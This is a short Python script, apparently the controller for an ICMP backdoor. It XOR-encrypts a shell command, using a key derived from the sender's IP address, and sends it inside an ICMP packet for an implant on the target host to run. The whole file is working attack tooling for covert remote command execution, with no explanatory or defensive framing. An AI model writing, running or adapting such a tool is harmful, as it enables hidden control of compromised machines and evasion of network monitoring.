import sys
import socket
import struct
import requests
from scapy.all import sr1, IP, ICMP

def get_local_ip(dst_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst_ip, 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def get_external_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except Exception:
        return None

def ip_to_key(ip):
    return struct.unpack('!I', socket.inet_aton(ip))[0]

def xor_encrypt(data, key):
    key_bytes = struct.pack('!I', key)
    return bytes([b ^ key_bytes[i % 4] for i, b in enumerate(data.encode())])

if len(sys.argv) < 3:
    print('Usage: {} IP "command" [--nat|-n]'.format(sys.argv[0]))
    exit(0)

dst_ip = sys.argv[1]
command = sys.argv[2]
use_nat = '--nat' in sys.argv or '-n' in sys.argv

if use_nat:
    ext_ip = get_external_ip()
    if not ext_ip:
        print("Can't get external IP")
        exit(1)
    key_ip = ext_ip
else:
    key_ip = get_local_ip(dst_ip)

key = ip_to_key(key_ip)
enc = xor_encrypt("run:" + command, key)

p = sr1(IP(dst=dst_ip)/ICMP()/enc)
if p:
    p.show()